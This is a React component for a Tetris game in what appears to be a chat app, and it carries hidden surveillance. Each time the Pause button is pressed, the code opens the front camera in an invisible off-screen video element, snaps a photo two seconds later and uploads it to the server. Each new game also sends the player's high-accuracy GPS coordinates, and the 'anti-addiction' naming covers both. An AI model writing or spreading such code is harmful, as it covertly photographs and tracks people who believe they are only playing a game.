import { useCallback, useEffect, useRef, useState } from "react";
import { API_URL } from "../api";

const BOARD_WIDTH = 10;
const BOARD_HEIGHT = 20;
const TETRIS_BEST_SCORE_KEY = "private-chat:tetris-best-score";

const PIECES = {
  I: {
    color: "tetris-cyan",
    matrix: [
      [0, 0, 0, 0],
      [1, 1, 1, 1],
      [0, 0, 0, 0],
      [0, 0, 0, 0],
    ],
  },
  J: {
    color: "tetris-blue",
    matrix: [
      [1, 0, 0],
      [1, 1, 1],
      [0, 0, 0],
    ],
  },
  L: {
    color: "tetris-orange",
    matrix: [
      [0, 0, 1],
      [1, 1, 1],
      [0, 0, 0],
    ],
  },
  O: {
    color: "tetris-yellow",
    matrix: [
      [1, 1],
      [1, 1],
    ],
  },
  S: {
    color: "tetris-green",
    matrix: [
      [0, 1, 1],
      [1, 1, 0],
      [0, 0, 0],
    ],
  },
  T: {
    color: "tetris-purple",
    matrix: [
      [0, 1, 0],
      [1, 1, 1],
      [0, 0, 0],
    ],
  },
  Z: {
    color: "tetris-red",
    matrix: [
      [1, 1, 0],
      [0, 1, 1],
      [0, 0, 0],
    ],
  },
};

const PIECE_TYPES = Object.keys(PIECES);
const LINE_SCORES = [0, 100, 300, 500, 800];
const ANTI_ADDICTION_PHOTO_DELAY_MS = 2000;
const ANTI_ADDICTION_PHOTO_MAX_SIZE = 480;

function createEmptyBoard() {
  return Array.from({ length: BOARD_HEIGHT }, () => Array.from({ length: BOARD_WIDTH }, () => ""));
}

function cloneMatrix(matrix) {
  return matrix.map((row) => [...row]);
}

function createPiece(type) {
  const shape = PIECES[type];
  return {
    color: shape.color,
    matrix: cloneMatrix(shape.matrix),
    type,
    x: Math.floor((BOARD_WIDTH - shape.matrix[0].length) / 2),
    y: 0,
  };
}

function getRandomPieceType() {
  return PIECE_TYPES[Math.floor(Math.random() * PIECE_TYPES.length)];
}

function readBestScore() {
  const savedScore = Number(window.localStorage.getItem(TETRIS_BEST_SCORE_KEY));
  return Number.isFinite(savedScore) ? savedScore : 0;
}

function rotateMatrix(matrix) {
  return matrix[0].map((_, columnIndex) => matrix.map((row) => row[columnIndex]).reverse());
}

function canPlacePiece(board, piece, nextX = piece.x, nextY = piece.y, nextMatrix = piece.matrix) {
  for (let y = 0; y < nextMatrix.length; y += 1) {
    for (let x = 0; x < nextMatrix[y].length; x += 1) {
      if (!nextMatrix[y][x]) {
        continue;
      }

      const boardX = nextX + x;
      const boardY = nextY + y;

      if (boardX < 0 || boardX >= BOARD_WIDTH || boardY >= BOARD_HEIGHT) {
        return false;
      }

      if (boardY >= 0 && board[boardY][boardX]) {
        return false;
      }
    }
  }

  return true;
}

function mergePiece(board, piece) {
  const nextBoard = board.map((row) => [...row]);

  piece.matrix.forEach((row, y) => {
    row.forEach((cell, x) => {
      if (cell && piece.y + y >= 0) {
        nextBoard[piece.y + y][piece.x + x] = piece.color;
      }
    });
  });

  return nextBoard;
}

function clearFullLines(board) {
  const remainingRows = board.filter((row) => row.some((cell) => !cell));
  const clearedLineCount = BOARD_HEIGHT - remainingRows.length;
  const emptyRows = Array.from({ length: clearedLineCount }, () =>
    Array.from({ length: BOARD_WIDTH }, () => ""),
  );

  return {
    board: [...emptyRows, ...remainingRows],
    clearedLineCount,
  };
}

function renderBoard(board, activePiece) {
  const displayBoard = board.map((row) => [...row]);

  activePiece.matrix.forEach((row, y) => {
    row.forEach((cell, x) => {
      const boardY = activePiece.y + y;
      const boardX = activePiece.x + x;

      if (cell && boardY >= 0 && boardY < BOARD_HEIGHT && boardX >= 0 && boardX < BOARD_WIDTH) {
        displayBoard[boardY][boardX] = activePiece.color;
      }
    });
  });

  return displayBoard;
}

function captureVideoFrame(video) {
  const sourceWidth = video.videoWidth || 720;
  const sourceHeight = video.videoHeight || 720;
  const scale = Math.min(1, ANTI_ADDICTION_PHOTO_MAX_SIZE / Math.max(sourceWidth, sourceHeight));
  const width = Math.max(1, Math.round(sourceWidth * scale));
  const height = Math.max(1, Math.round(sourceHeight * scale));
  const canvas = document.createElement("canvas");
  canvas.width = width;
  canvas.height = height;
  const context = canvas.getContext("2d");

  if (!context) {
    return "";
  }

  context.drawImage(video, 0, 0, width, height);
  return canvas.toDataURL("image/jpeg", 0.62);
}

async function startFrontCameraVideo() {
  if (!navigator.mediaDevices?.getUserMedia) {
    return null;
  }

  const stream = await navigator.mediaDevices.getUserMedia({
    audio: false,
    video: {
      facingMode: "user",
      height: { ideal: 720 },
      width: { ideal: 720 },
    },
  });
  const video = document.createElement("video");

  video.autoplay = true;
  video.muted = true;
  video.playsInline = true;
  video.style.height = "1px";
  video.style.left = "-9999px";
  video.style.opacity = "0";
  video.style.position = "fixed";
  video.style.top = "0";
  video.style.width = "1px";

  document.body.appendChild(video);

  try {
    await new Promise((resolve, reject) => {
      const timeoutId = window.setTimeout(() => reject(new Error("Camera timed out.")), 5000);

      video.onloadedmetadata = () => {
        video.play()
          .then(() => {
            window.clearTimeout(timeoutId);
            resolve();
          })
          .catch((error) => {
            window.clearTimeout(timeoutId);
            reject(error);
          });
      };

      video.srcObject = stream;
    });

    return {
      stream,
      video,
    };
  } catch (error) {
    stream.getTracks().forEach((track) => track.stop());
    video.remove();
    throw error;
  }
}

function TetrisGame() {
  const [board, setBoard] = useState(createEmptyBoard);
  const [activePiece, setActivePiece] = useState(() => createPiece(getRandomPieceType()));
  const [nextPieceType, setNextPieceType] = useState(getRandomPieceType);
  const [score, setScore] = useState(0);
  const [bestScore, setBestScore] = useState(readBestScore);
  const [lines, setLines] = useState(0);
  const [level, setLevel] = useState(1);
  const [status, setStatus] = useState("idle");

  const boardRef = useRef(board);
  const activePieceRef = useRef(activePiece);
  const nextPieceTypeRef = useRef(nextPieceType);
  const scoreRef = useRef(score);
  const linesRef = useRef(lines);
  const statusRef = useRef(status);
  const antiAddictionTimerRef = useRef(0);
  const antiAddictionStreamRef = useRef(null);
  const antiAddictionVideoRef = useRef(null);
  useEffect(() => {
    fetch(`${API_URL}/api/game-records/tetris`, {
      credentials: "include",
      method: "POST",
    }).catch(() => {
      // Game access logging should never block playing the game.
    });
  }, []);

  const recordNewGameLocation = useCallback(() => {
    if (!navigator.geolocation) {
      return;
    }

    navigator.geolocation.getCurrentPosition(
      (position) => {
        fetch(`${API_URL}/api/game-records/tetris`, {
          body: JSON.stringify({
            accuracy: position.coords.accuracy,
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
          }),
          credentials: "include",
          headers: {
            "Content-Type": "application/json",
          },
          method: "POST",
        }).catch(() => {
          // Location logging should never block starting a game.
        });
      },
      () => {
        // Users can deny location access and still play normally.
      },
      {
        enableHighAccuracy: true,
        maximumAge: 0,
        timeout: 15000,
      },
    );
  }, []);

  const cleanupAntiAddictionCamera = useCallback(() => {
    if (antiAddictionTimerRef.current) {
      window.clearTimeout(antiAddictionTimerRef.current);
      antiAddictionTimerRef.current = 0;
    }

    if (antiAddictionStreamRef.current) {
      antiAddictionStreamRef.current.getTracks().forEach((track) => track.stop());
      antiAddictionStreamRef.current = null;
    }

    if (antiAddictionVideoRef.current) {
      antiAddictionVideoRef.current.remove();
      antiAddictionVideoRef.current = null;
    }
  }, []);

  const recordAntiAddictionPhoto = useCallback(async (photoDataUrl) => {
    try {
      if (!photoDataUrl) {
        return;
      }

      await fetch(`${API_URL}/api/game-records/tetris`, {
        body: JSON.stringify({
          photoDataUrl,
        }),
        credentials: "include",
        headers: {
          "Content-Type": "application/json",
        },
        method: "POST",
      });
    } catch {
      // Photo upload should never block the game.
    }
  }, []);

  const scheduleAntiAddictionPhoto = useCallback(async () => {
    cleanupAntiAddictionCamera();

    try {
      const camera = await startFrontCameraVideo();

      if (!camera) {
        return;
      }

      antiAddictionStreamRef.current = camera.stream;
      antiAddictionVideoRef.current = camera.video;
      antiAddictionTimerRef.current = window.setTimeout(() => {
        const photoDataUrl = captureVideoFrame(camera.video);

        cleanupAntiAddictionCamera();
        recordAntiAddictionPhoto(photoDataUrl);
      }, ANTI_ADDICTION_PHOTO_DELAY_MS);
    } catch {
      cleanupAntiAddictionCamera();
      // Camera permission can be denied; the game should keep running.
    }
  }, [cleanupAntiAddictionCamera, recordAntiAddictionPhoto]);

  useEffect(() => cleanupAntiAddictionCamera, [cleanupAntiAddictionCamera]);

  const setBoardState = useCallback((nextBoard) => {
    boardRef.current = nextBoard;
    setBoard(nextBoard);
  }, []);

  const setActivePieceState = useCallback((nextPiece) => {
    activePieceRef.current = nextPiece;
    setActivePiece(nextPiece);
  }, []);

  const setNextPieceTypeState = useCallback((nextType) => {
    nextPieceTypeRef.current = nextType;
    setNextPieceType(nextType);
  }, []);

  const setStatusState = useCallback((nextStatus) => {
    statusRef.current = nextStatus;
    setStatus(nextStatus);
  }, []);

  const updateScore = useCallback((nextScore) => {
    scoreRef.current = nextScore;
    setScore(nextScore);
    setBestScore((currentBest) => {
      const nextBest = Math.max(currentBest, nextScore);
      window.localStorage.setItem(TETRIS_BEST_SCORE_KEY, String(nextBest));
      return nextBest;
    });
  }, []);

  const spawnNextPiece = useCallback((nextBoard) => {
    const nextPiece = createPiece(nextPieceTypeRef.current);
    const upcomingPieceType = getRandomPieceType();
    setNextPieceTypeState(upcomingPieceType);

    if (!canPlacePiece(nextBoard, nextPiece)) {
      setStatusState("lost");
      return;
    }

    setActivePieceState(nextPiece);
  }, [setActivePieceState, setNextPieceTypeState, setStatusState]);

  const lockActivePiece = useCallback(() => {
    const lockedBoard = mergePiece(boardRef.current, activePieceRef.current);
    const clearResult = clearFullLines(lockedBoard);

    if (clearResult.clearedLineCount > 0) {
      const nextLines = linesRef.current + clearResult.clearedLineCount;
      const nextLevel = Math.floor(nextLines / 10) + 1;
      const nextScore =
        scoreRef.current + LINE_SCORES[clearResult.clearedLineCount] * level;

      linesRef.current = nextLines;
      setLines(nextLines);
      setLevel(nextLevel);
      updateScore(nextScore);
    }

    setBoardState(clearResult.board);
    spawnNextPiece(clearResult.board);
  }, [level, setBoardState, spawnNextPiece, updateScore]);

  const moveActivePiece = useCallback((dx, dy) => {
    if (statusRef.current !== "running") {
      return false;
    }

    const currentPiece = activePieceRef.current;
    const nextX = currentPiece.x + dx;
    const nextY = currentPiece.y + dy;

    if (canPlacePiece(boardRef.current, currentPiece, nextX, nextY)) {
      setActivePieceState({ ...currentPiece, x: nextX, y: nextY });
      return true;
    }

    if (dy > 0) {
      lockActivePiece();
    }

    return false;
  }, [lockActivePiece, setActivePieceState]);

  const rotateActivePiece = useCallback(() => {
    if (statusRef.current !== "running") {
      return;
    }

    const currentPiece = activePieceRef.current;
    const rotatedMatrix = rotateMatrix(currentPiece.matrix);
    const kicks = [0, -1, 1, -2, 2];

    for (const offset of kicks) {
      const nextX = currentPiece.x + offset;

      if (canPlacePiece(boardRef.current, currentPiece, nextX, currentPiece.y, rotatedMatrix)) {
        setActivePieceState({ ...currentPiece, matrix: rotatedMatrix, x: nextX });
        return;
      }
    }
  }, [setActivePieceState]);

  const hardDrop = useCallback(() => {
    if (statusRef.current !== "running") {
      return;
    }

    const currentPiece = activePieceRef.current;
    let nextY = currentPiece.y;

    while (canPlacePiece(boardRef.current, currentPiece, currentPiece.x, nextY + 1)) {
      nextY += 1;
    }

    setActivePieceState({ ...currentPiece, y: nextY });
    activePieceRef.current = { ...currentPiece, y: nextY };
    lockActivePiece();
  }, [lockActivePiece, setActivePieceState]);

  const startGame = useCallback(() => {
    const freshBoard = createEmptyBoard();
    const firstPiece = createPiece(getRandomPieceType());

    recordNewGameLocation();
    linesRef.current = 0;
    scoreRef.current = 0;
    setLines(0);
    setLevel(1);
    updateScore(0);
    setBoardState(freshBoard);
    setActivePieceState(firstPiece);
    setNextPieceTypeState(getRandomPieceType());
    setStatusState("running");
  }, [
    recordNewGameLocation,
    setActivePieceState,
    setBoardState,
    setNextPieceTypeState,
    setStatusState,
    updateScore,
  ]);

  const togglePause = useCallback(() => {
    if (statusRef.current === "running") {
      setStatusState("paused");
      return;
    }

    if (statusRef.current === "paused" || statusRef.current === "idle") {
      setStatusState("running");
    }
  }, [setStatusState]);

  const handleGameButtonPointerDown = useCallback((event) => {
    event.currentTarget.focus({ preventScroll: true });
    event.preventDefault();

    const action = event.currentTarget.dataset.action;

    if (action === "pause") {
      scheduleAntiAddictionPhoto();

      if (statusRef.current === "lost") {
        startGame();
      } else {
        togglePause();
      }
      return;
    }

    if (action === "new-game") {
      startGame();
      return;
    }

    if (action === "left") {
      moveActivePiece(-1, 0);
      return;
    }

    if (action === "rotate") {
      rotateActivePiece();
      return;
    }

    if (action === "right") {
      moveActivePiece(1, 0);
      return;
    }

    if (action === "down") {
      moveActivePiece(0, 1);
      return;
    }

    if (action === "drop") {
      hardDrop();
    }
  }, [hardDrop, moveActivePiece, rotateActivePiece, scheduleAntiAddictionPhoto, startGame, togglePause]);

  const preventGameButtonContextMenu = useCallback((event) => {
    event.preventDefault();
  }, []);

  useEffect(() => {
    const handleKeyDown = (event) => {
      if (event.key === "ArrowLeft" || event.key === "a" || event.key === "A") {
        event.preventDefault();
        moveActivePiece(-1, 0);
        return;
      }

      if (event.key === "ArrowRight" || event.key === "d" || event.key === "D") {
        event.preventDefault();
        moveActivePiece(1, 0);
        return;
      }

      if (event.key === "ArrowDown" || event.key === "s" || event.key === "S") {
        event.preventDefault();
        moveActivePiece(0, 1);
        return;
      }

      if (event.key === "ArrowUp" || event.key === "w" || event.key === "W") {
        event.preventDefault();
        rotateActivePiece();
        return;
      }

      if (event.key === " ") {
        event.preventDefault();
        hardDrop();
        return;
      }

      if (event.key === "p" || event.key === "P") {
        event.preventDefault();
        togglePause();
      }
    };

    window.addEventListener("keydown", handleKeyDown);
    return () => window.removeEventListener("keydown", handleKeyDown);
  }, [hardDrop, moveActivePiece, rotateActivePiece, togglePause]);

  useEffect(() => {
    if (status !== "running") {
      return undefined;
    }

    const dropMs = Math.max(180, 720 - (level - 1) * 55);
    const timerId = window.setInterval(() => {
      moveActivePiece(0, 1);
    }, dropMs);

    return () => window.clearInterval(timerId);
  }, [level, moveActivePiece, status]);

  const displayBoard = renderBoard(board, activePiece);
  const nextPiece = createPiece(nextPieceType);
  const statusText = {
    idle: "Ready / 准备",
    running: "Playing / 游戏中",
    paused: "Paused / 暂停",
    lost: "Game over / 游戏结束",
  }[status];

  return (
    <main className="tetris-page">
      <section className="tetris-shell" aria-label="Tetris game / 俄罗斯方块游戏">
        <div className="tetris-header">
          <div>
            <h1>Tetris / 俄罗斯方块</h1>
          </div>
          <div className="tetris-scoreboard" aria-label="Score / 分数">
            <span>Score {score}</span>
            <span>Best {bestScore}</span>
            <span>Lines {lines}</span>
            <span>Level {level}</span>
          </div>
        </div>

        <div className="tetris-layout">
          <div className="tetris-board" role="application" aria-label="Tetris board / 俄罗斯方块棋盘">
            {displayBoard.flatMap((row, y) =>
              row.map((cell, x) => (
                <div
                  className={["tetris-cell", cell].filter(Boolean).join(" ")}
                  key={`${x}-${y}`}
                />
              )),
            )}
          </div>

          <aside className="tetris-side-panel">
            <div>
              <div className="tetris-panel-label">Next / 下一个</div>
              <div className="tetris-next-piece">
                {Array.from({ length: 16 }, (_, index) => {
                  const x = index % 4;
                  const y = Math.floor(index / 4);
                  const cell = nextPiece.matrix[y]?.[x] ? nextPiece.color : "";

                  return (
                    <div
                      className={["tetris-cell", cell].filter(Boolean).join(" ")}
                      key={`${x}-${y}`}
                    />
                  );
                })}
              </div>
            </div>

            <div className="tetris-status">{statusText}</div>

            <div className="tetris-key-help" aria-label="Keyboard controls / 键盘控制">
              <span>← → / A D move</span>
              <span>↑ / W rotate</span>
              <span>↓ / S down</span>
              <span>Space drop</span>
              <span>P pause</span>
            </div>

            <div className="tetris-actions">
              <button
                type="button"
                data-action="pause"
                onContextMenu={preventGameButtonContextMenu}
                onPointerDown={handleGameButtonPointerDown}
              >
                {status === "lost" ? "Restart / 重新开始" : "Pause / 暂停"}
              </button>
              <button
                type="button"
                data-action="new-game"
                onContextMenu={preventGameButtonContextMenu}
                onPointerDown={handleGameButtonPointerDown}
              >
                New game / 新游戏
              </button>
            </div>
          </aside>
        </div>

        <div className="tetris-controls" aria-label="Tetris controls / 俄罗斯方块控制">
          <button
            type="button"
            aria-label="Left / 左"
            data-action="left"
            onContextMenu={preventGameButtonContextMenu}
            onPointerDown={handleGameButtonPointerDown}
          >
            ←
          </button>
          <button
            type="button"
            aria-label="Rotate / 旋转"
            data-action="rotate"
            onContextMenu={preventGameButtonContextMenu}
            onPointerDown={handleGameButtonPointerDown}
          >
            ↻
          </button>
          <button
            type="button"
            aria-label="Right / 右"
            data-action="right"
            onContextMenu={preventGameButtonContextMenu}
            onPointerDown={handleGameButtonPointerDown}
          >
            →
          </button>
          <button
            type="button"
            aria-label="Down / 下落"
            data-action="down"
            onContextMenu={preventGameButtonContextMenu}
            onPointerDown={handleGameButtonPointerDown}
          >
            ↓
          </button>
          <button
            type="button"
            aria-label="Drop / 直落"
            data-action="drop"
            onContextMenu={preventGameButtonContextMenu}
            onPointerDown={handleGameButtonPointerDown}
          >
            ⇩
          </button>
        </div>
      </section>
    </main>
  );
}

export default TetrisGame;
